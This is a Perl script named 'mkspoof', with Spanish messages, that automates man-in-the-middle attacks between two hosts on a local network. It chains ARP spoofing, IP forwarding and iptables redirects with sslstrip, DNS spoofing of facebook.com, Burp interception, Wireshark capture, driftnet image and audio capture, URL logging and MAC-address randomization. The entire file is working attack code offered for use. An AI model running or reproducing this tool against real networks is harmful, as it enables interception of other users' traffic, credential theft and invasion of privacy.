#!/usr/bin/perl
use strict;
use warnings;


#    Copyright (C) 2014 Miguel Angel García
#  
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

 
use constant CONSTANTE_SSL => "-ssl";
use constant CONSTANTE_DNS => "-dns";
use constant CONSTANTE_BURP => "-burp";
 
my $lStrNombreScript = "./mkspoof";
my $lStrRutaHelper = "./helper.sh";
my $lStrHostsDns = "dns_hosts_spoof.txt";
 
my $lIntNumeroArgumentos = $#ARGV + 1;
my $lStrCadenaEjecucion = "gnome-terminal -x $lStrRutaHelper";
 
my $lStrDir;
my $lStrCapturaHTTP;
my $lStrCapturaWireshark;
 
my $lStrArgumentos = UnificarParametros(" ", @ARGV);
 
if($lIntNumeroArgumentos == 1 && ($ARGV[0] eq "--version" || $ARGV[0] eq "-v" ))
{
        ImprimirVersion();
}
elsif($lIntNumeroArgumentos == 1 && ($ARGV[0] eq "--desactivar" || $ARGV[0] eq "-d" ))
{
        Desactivar();
}
elsif($lIntNumeroArgumentos == 2 && (index($lStrArgumentos, "--mac") != -1) && (index($lStrArgumentos, "-i=") != -1))
{
        my $lStrInterfaz = ObtenerContenidoEntreElementos($lStrArgumentos, "-i=", " ", 0);
        if($lStrInterfaz eq "")
        {
                print("No se especificó interfaz de red\n\n");
                ImprimirUso();
        }
        else
        {
                CambiarMac($lStrInterfaz);
        }
}
elsif($lIntNumeroArgumentos == 4 && index($lStrArgumentos, "-h1=") != -1 && index($lStrArgumentos, "-h2=") != -1 && index($lStrArgumentos, "-i=") != -1)
{      
        my $lIntNumeroOpciones = 0;
        my $lBlnParametrosCorrectos = 1;
        my $lStrIP1;
        my $lStrIP2;
        my $lStrInterfaz;
        my $lStrOpcion;
       
        $lStrIP1 = ObtenerContenidoEntreElementos($lStrArgumentos, "-h1=", " ", 0);
        $lStrIP2 = ObtenerContenidoEntreElementos($lStrArgumentos, "-h2=", " ", 0);
       
        if($lBlnParametrosCorrectos)
        {
                if($lStrIP1 eq $lStrIP2)
                {
                        $lBlnParametrosCorrectos = 0;
                        print("Las IPs para -h1- y -h2- no pueden tener el mismo valor.\n\n");
                        ImprimirUso();
                }
        }
       
        if($lBlnParametrosCorrectos)
        {
                $lBlnParametrosCorrectos = EsIPv4Valida($lStrIP1) && EsIPv4Valida($lStrIP2);
                if(!$lBlnParametrosCorrectos)
                {
                        print("Las IPs para -h1- y -h2- tienen que ser IPv4 válidas.\n\n");
                        ImprimirUso();
                }
        }
       
        if($lBlnParametrosCorrectos)
        {
                if(index($lStrArgumentos, CONSTANTE_SSL) != -1)
                {
                        $lIntNumeroOpciones++;
                        $lStrOpcion = CONSTANTE_SSL;
                }
                if(index($lStrArgumentos, CONSTANTE_DNS) != -1)
                {
                        $lIntNumeroOpciones++;
                        $lStrOpcion = CONSTANTE_DNS;
                }
                if(index($lStrArgumentos, CONSTANTE_BURP) != -1)
                {
                        $lIntNumeroOpciones++;
                        $lStrOpcion = CONSTANTE_BURP;
                }
 
                if($lIntNumeroOpciones > 1)
                {
                        $lBlnParametrosCorrectos = 0;
                        print("Seleccione una opción: " . CONSTANTE_SSL . ", " . CONSTANTE_DNS . " o " . CONSTANTE_BURP . "\n\n");
                        ImprimirUso();
                }
                elsif($lIntNumeroOpciones == 0)
                {
                        $lBlnParametrosCorrectos = 0;
                        print("Se debe seleccionar una opción: " . CONSTANTE_SSL . ", " . CONSTANTE_DNS . " o " . CONSTANTE_BURP . "\n\n");
                        ImprimirUso();
                }
        }
       
        if($lBlnParametrosCorrectos)
        {
                $lStrInterfaz = ObtenerContenidoEntreElementos($lStrArgumentos, "-i=", " ", 0);
                if($lStrInterfaz eq "")
                {
                        $lBlnParametrosCorrectos = 0;
                        print("No se especificó interfaz de red\n\n");
                        ImprimirUso();
                }
        }
       
        if($lBlnParametrosCorrectos && $lStrOpcion eq CONSTANTE_SSL)
        {
                ActivarSSL($lStrIP1, $lStrIP2, $lStrInterfaz, $lStrOpcion);
        }
        elsif($lBlnParametrosCorrectos && $lStrOpcion eq CONSTANTE_DNS)
        {
                ActivarDNS($lStrIP1, $lStrIP2, $lStrInterfaz, $lStrOpcion);
        }
        elsif($lBlnParametrosCorrectos && $lStrOpcion eq CONSTANTE_BURP)
        {
                ActivarBURP($lStrIP1, $lStrIP2, $lStrInterfaz, $lStrOpcion);
        }
}
else
{
        ImprimirUso();
}
 
sub EsIPv4Valida
{
        return $_[0] =~ m/^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/;
}
 
sub UnificarParametros
{
        my ($lStrSeparador, @lArrParametros) = @_;
        my $lStrResultado = "";
        foreach(@lArrParametros)
        {
                $lStrResultado = $lStrResultado . "$_$lStrSeparador";
        }
 
        return $lStrResultado;
}
 
sub CambiarMac
{
        my $pStrIdentificador = $_[0];
 
        system("ifconfig $pStrIdentificador down");
        system("macchanger -r $pStrIdentificador");
        system("ifconfig $pStrIdentificador up");
}
 
sub ImprimirVersion
{
        print("\nVersión: 2.4\n");
        print("Autor: Miguel Ángel García\n");
        print("Web: http://www.nodoraiz.com\n\n");
}
 
sub ImprimirUso
{
        print("\nUso: $lStrNombreScript -i=interfaz_red -h1=ip_host1 -h2=ip_host2 { " , CONSTANTE_SSL, " | " , CONSTANTE_DNS, " | " , CONSTANTE_BURP, " }\n");
        print(" - Ejemplo para captura de tráfico SSL: $lStrNombreScript -i=eth0 -h1=192.168.0.5 -h2=192.168.0.254 " , CONSTANTE_SSL, "\n");
        print(" - Ejemplo para uso de técnica DNS Spoof: $lStrNombreScript -i=eth0 -h1=192.168.0.5 -h2=192.168.0.254 " , CONSTANTE_DNS, "\n");
        print(" - Ejemplo para redirección a BURP: $lStrNombreScript -i=eth0 -h1=192.168.0.5 -h2=192.168.0.254 " , CONSTANTE_BURP, "\n");
        print(" - ip_host1 e ip_host2 tienen que ser IPv4 válidas, ejemplo: 10.0.2.3\n");
        print(" - ip_host1 e ip_host2 tienen que ser IPv4 distintas\n");
        print("\n");
        print("Uso: $lStrNombreScript { --desactivar | -d }\n");
        print(" - Desactiva la captura activa\n");
        print("\n");
        print("Uso: $lStrNombreScript -i=interfaz_red --mac \n");
        print(" - Cambia la dirección MAC del adaptador especificado\n");
        print("\n");
        print("Uso: $lStrNombreScript { --version | -v }\n");
        print("\n");
}
 
sub ObtenerPIDTerminales
{
        my @lArrTerminales = split("\n", `ps -e | ps -e | grep $_[0] | awk '{print \$2}'`);
        my @lArrPIDs;
 
        foreach (@lArrTerminales)
        {
                push (@lArrPIDs, Trim(`ps -e | grep bash | grep $_ | awk '{print \$1}'`));
        }
 
        return @lArrPIDs;
}
 
sub CrearHelper
{
        system("echo '#! /bin/bash\n\$@\n/bin/bash' > $lStrRutaHelper");
        system("chmod +x $lStrRutaHelper");
        print("Se ha creado el script -$lStrRutaHelper- para facilitar la ejecución de los comandos\n");
}
 
sub CrearFicheroHostsDns
{
        system("echo '127.0.0.1\t*.facebook.com\n127.0.0.1\tfacebook.com' > $lStrHostsDns");
        print("Se ha creado el fichero -$lStrHostsDns- para la técnica DNS Spoof. Si se modifica su contenido será necesario reiniciar el script de spoof\n");
}
 
sub Trim
{
        $_[0] =~ s/^\s+//m;
        $_[0] =~ s/\s+$//m;
        return $_[0];
}
 
sub ObtenerContenidoEntreElementos
{
        my ($contenido, $inicio, $fin, $offset) = @_;
        my $resultado = "";
       
        my $indiceInicio = index($contenido, $inicio, $offset);
        my $indiceFin = -1;
       
        if( $indiceInicio != -1)
        {
                $indiceFin = index($contenido, $fin, $indiceInicio + length($inicio));
                if( $indiceFin > 0)
                {
                        $resultado = substr($contenido, $indiceInicio + length($inicio), $indiceFin - $indiceInicio - length($inicio));
                }
        }
       
        return $resultado;
}
 
sub Desactivar
{
        my $lStrActividad = `cat .resultados`;
        $lStrDir = ObtenerContenidoEntreElementos($lStrActividad, ":1:", ":2:", 0);
        my $lStrModo = ObtenerContenidoEntreElementos($lStrActividad, ":2:", ":3:", 0);
 
        system("kill `ps -e | grep arpspoof | awk '{print \$1}'`");
        print("Se ha solicitado la finalización de \"arpspoof\"\n");
        system("kill `ps -e | grep urlsnarf | awk '{print \$1}'`");
        print("Se ha solicitado la finalización de \"urlsnarf\"\n");
        if($lStrModo eq CONSTANTE_SSL)
        {
                system("kill `ps -e | grep sslstrip | awk '{print \$1}'`");
                print("Se ha solicitado la finalización de \"sslstrip\"\n");
                system("iptables -t nat --flush");
                print("Se ha borrado correctamente el enrutado de \"iptables\"\n");
        }
        elsif($lStrModo eq CONSTANTE_DNS)
        {
                system("kill `ps -e | grep dnsspoof | awk '{print \$1}'`");
                print("Se ha solicitado la finalización de \"dnsspoof\"\n");
        }
        elsif($lStrModo eq CONSTANTE_BURP)
        {
                system("kill `ps -e | grep java | awk '{print \$1}'`");
                print("Se ha solicitado la finalización de \"Burp\"\n");
                system("iptables -t nat --flush");
                print("Se ha borrado correctamente el enrutado de \"iptables\"\n");
        }
 
        system("kill `ps -e | grep driftnet | awk '{print \$1}'`");
        print("Se ha solicitado la finalización de \"driftnet\"\n");
        system("kill `ps -e | grep wireshark | awk '{print \$1}'`");
        print("Se ha solicitado la finalización de \"wireshark\"\n");
        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
        print("Se ha restablecido el valor por defecto para \"ip_forward\"\n");
 
        my $lIntCiclosMaximos = 15;
        my $i = 0;
        my $lBlnFinalizar = 0;
        do
        {
                my $temp = `ps -A | egrep -w 'arpspoof|urlsnarf|sslstrip|dnsspoof|wireshark|driftnet|java'`;
                $lBlnFinalizar = ($temp eq "");
                if($lBlnFinalizar)
                {
                        $i = $lIntCiclosMaximos;
                }
                else
                {
                        $i++;
                        print("Iteración [$i/$lIntCiclosMaximos]. Se dormirá 1 segundo esperando a que los procesos finalicen.\n");
                        system("sleep 1");
                }
        }while($i < $lIntCiclosMaximos);
 
 
        if($lBlnFinalizar)
        {
                print("Se han finalizado todos los procesos\n");
 
                my @lArrTerminalesPids;
                push (@lArrTerminalesPids, ObtenerPIDTerminales("helper.sh"));
 
                foreach(@lArrTerminalesPids)
                {
                        system("kill -9 $_");
                }
 
                print("Se han cerrado todas las terminales.\n");
        }
        else
        {
                print("No se pudieron finalizar las terminales porque los siguientes procesos no pudieron ser detenidos:\n");
                print(`ps -A | egrep -w 'arpspoof|urlsnarf|sslstrip|dnsspoof|wireshark|driftnet|java'`);
        }
 
        system("rm $lStrRutaHelper");
        print("Eliminado el script -$lStrRutaHelper-\n");
 
        system("nautilus $lStrDir");
        system("rm .resultados");
 
        print("\n");
}
 
sub ActivarSSL
{
        my($pStrIP1, $pStrIP2, $pStrInterfaz, $pStrModo) = @_;
       
        if (!(-e "$lStrRutaHelper"))
        {
                CrearHelper();
        }
 
        $lStrDir = Trim(`date '+./resultados_%Y.%m.%d_%H.%M.%S'`);
        system("mkdir $lStrDir");
        print("Se ha creado el directorio -$lStrDir-, se guardarán los resultados en su interior.\n");
        system("echo :1:$lStrDir:2:$pStrModo:3: > .resultados");
 
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        print("Se ha activado el ip_forward.\n");
 
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP1 $pStrIP2");
        print("Habilitado -arpspoof- sobre $pStrIP1, se suplantará a $pStrIP2.\n");
       
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP2 $pStrIP1");
        print("Habilitado -arpspoof- sobre $pStrIP2, se suplantará a $pStrIP1.\n");
 
        system("iptables -F");
        system("iptables -t nat -F");
        system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 10000");
        print("Se ha establecido un enrutado en iptables para dirigir todo el tráfico HTTP por el puerto 10000.\n");
 
        $lStrCapturaHTTP = "$lStrDir/captura_http.txt";
        system("$lStrCadenaEjecucion sslstrip -k -l 10000 -w $lStrCapturaHTTP");
        print("Activada captura de tráfico HTTP, se guardará en -$lStrCapturaHTTP-.\n");
 
        $lStrCapturaWireshark = "$lStrDir/captura_wireshark.pcap";
        system("$lStrCadenaEjecucion wireshark -i $pStrInterfaz -k -S -w $lStrCapturaWireshark");
        print("Iniciado -wireshark-, se guardará el tráfico capturado en -$lStrCapturaWireshark-.\n");
 
        system("$lStrCadenaEjecucion driftnet -d $lStrDir -a -s");
        print("Iniciado -driftnet-, se guardarán las imágenes visualizadas y audio MPEG en -$lStrDir-.\n");
       
        system("$lStrCadenaEjecucion urlsnarf");
        print("Activada captura de enlaces visitados con -urlsnarf-.\n");
}
 
sub ActivarDNS
{
        my($pStrIP1, $pStrIP2, $pStrInterfaz, $pStrModo) = @_;
       
        if (!(-e "$lStrRutaHelper"))
        {
                CrearHelper();
        }
 
        $lStrDir = Trim(`date '+./resultados_%Y.%m.%d_%H.%M.%S'`);
        system("mkdir $lStrDir");
        print("Se ha creado el directorio -$lStrDir-, se guardarán los resultados en su interior.\n");
        system("echo :1:$lStrDir:2:$pStrModo:3: > .resultados");
 
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        print("Se ha activado el ip_forward.\n");
 
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP1 $pStrIP2");
        print("Habilitado -arpspoof- sobre $pStrIP1, se suplantará a $pStrIP2.\n");
       
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP2 $pStrIP1");
        print("Habilitado -arpspoof- sobre $pStrIP2, se suplantará a $pStrIP1.\n");
 
        if (!(-e "$lStrHostsDns"))
        {
                CrearFicheroHostsDns();
        }
        system("$lStrCadenaEjecucion dnsspoof -i $pStrInterfaz -f $lStrHostsDns");
        print("Activada -dnsspoof-, se utilizará el mapeo definido en -$lStrHostsDns-.\n");
 
        $lStrCapturaWireshark = "$lStrDir/captura_wireshark.pcap";
        system("$lStrCadenaEjecucion wireshark -i $pStrInterfaz -k -S -w $lStrCapturaWireshark");
        print("Iniciado -wireshark-, se guardará el tráfico capturado en -$lStrCapturaWireshark-.\n");
 
        system("$lStrCadenaEjecucion driftnet -d $lStrDir -a -s");
        print("Iniciado -driftnet-, se guardarán las imágenes visualizadas y audio MPEG en -$lStrDir-.\n");
       
        system("$lStrCadenaEjecucion urlsnarf");
        print("Activada captura de enlaces visitados con -urlsnarf-.\n");
}
 
sub ActivarBURP
{
        my($pStrIP1, $pStrIP2, $pStrInterfaz, $pStrModo) = @_;
       
        if (!(-e "$lStrRutaHelper"))
        {
                CrearHelper();
        }
 
        $lStrDir = Trim(`date '+./resultados_%Y.%m.%d_%H.%M.%S'`);
        system("mkdir $lStrDir");
        print("Se ha creado el directorio -$lStrDir-, se guardarán los resultados en su interior.\n");
        system("echo :1:$lStrDir:2:$pStrModo:3: > .resultados");
 
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        print("Se ha activado el ip_forward.\n");
 
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP1 $pStrIP2");
        print("Habilitado -arpspoof- sobre $pStrIP1, se suplantará a $pStrIP2.\n");
       
        system("$lStrCadenaEjecucion arpspoof -i $pStrInterfaz -t $pStrIP2 $pStrIP1");
        print("Habilitado -arpspoof- sobre $pStrIP2, se suplantará a $pStrIP1.\n");
 
        system("iptables -F");
        system("iptables -t nat -F");
        system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080");
        print("Se ha establecido un enrutado por iptables el tráfico HTTP por el puerto 8080.\n");
        system("$lStrCadenaEjecucion burpsuite.jar");
        print("Iniciado -Burp-.\n");
 
        $lStrCapturaWireshark = "$lStrDir/captura_wireshark.pcap";
        system("$lStrCadenaEjecucion wireshark -i $pStrInterfaz -k -S -w $lStrCapturaWireshark");
        print("Iniciado -wireshark-, se guardará el tráfico capturado en -$lStrCapturaWireshark-.\n");
 
        system("$lStrCadenaEjecucion driftnet -d $lStrDir -a -s");
        print("Iniciado -driftnet-, se guardarán las imágenes visualizadas y audio MPEG en -$lStrDir-.\n");
}